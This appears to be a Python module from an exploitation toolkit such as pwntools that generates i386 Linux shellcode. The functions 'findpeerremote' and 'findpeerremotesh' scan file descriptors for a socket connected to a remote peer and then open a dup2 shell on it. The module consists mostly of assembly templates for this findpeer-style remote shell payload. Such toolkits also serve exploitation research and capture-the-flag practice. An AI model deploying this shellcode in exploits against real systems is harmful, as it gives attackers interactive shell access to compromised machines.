from pwn.internal.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findpeerremotesh(clear_direction_flag = False, paranoid = False):
    """
    Finds an open socket which connects to a remote host,
    and then opens a dup2 shell on it."""
    return findpeerremote(clear_direction_flag, paranoid), dupsh("edx")

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findpeerremote(clear_direction_flag = False, paranoid = False, network = None):
    """
    Finds a remote socket, which is connected to the specified port.
    Leaves socket in EDX.

    Set clear_direction_flag to True, if the direction flag is set when this
    code is run (not likely).

    Set to paranoid to True if you suspect there is a socket with
    a size larger than 40 bytes just beforethe socket you are looking for.
    It costs an extra byte in the shellcode.
    """

    cld = 'cld' if clear_direction_flag else '; cld'

    if network == 'ipv4':
        af = 'AF_INET'
        extra = ''
        if paranoid:
            length_push = 'push 8'
        else:
            length_push = 'push eax'
    elif network == 'ipv6':
        af = 'AF_INET6'
        extra = 'push 4\npop ecx\nrepe cmpsd'
        if paranoid:
            length_push = 'pushad\npush 28'
        else:
            length_push = 'pushad\npush eax'
    else:
        bug('Network was neither ipv4 or ipv6')

    return """

findpeerremote:
    mov ebp, esp

    ; This sets edx to -1 or -2. We don't really care as long as it's slightly below 0.
    cdq
    dec edx

    ; We possibly need to clear direction flag
    %s

.loop:
    ; next file descriptor please
    inc edx

    ; reset stack
    mov esp, ebp

    ; make room for a sockaddr_in/sockaddr_in6
    pushad

    ; Sets up ebx for syscall.
    ; Also some fiddling to make edi = esi on the first pass
    push SYS_socketcall_getpeername
    mov edi, esp
    pop ebx

    ; This next block is run twice. Once for getpeername, once for getsockname
    ; The stack is not popped between runs (on purpose)
.twice:

    ; Set eax = SYS_socket
    push SYS_socketcall
    mov esi, esp
    pop eax

    %s

    push esp
    push esi
    push edx
    mov ecx, esp

    pushad
    int 0x80
    popad

    cmp byte [esi], %s
    jne .loop

    dec ebx             ; SYS_socketcall_getsockname == SYS_socketcall_getpeername - 1
    cmp edi, esi
    je .twice

    cmpsd
    cmpsd

    %s

    je .loop
""" % (cld, length_push, af, extra)
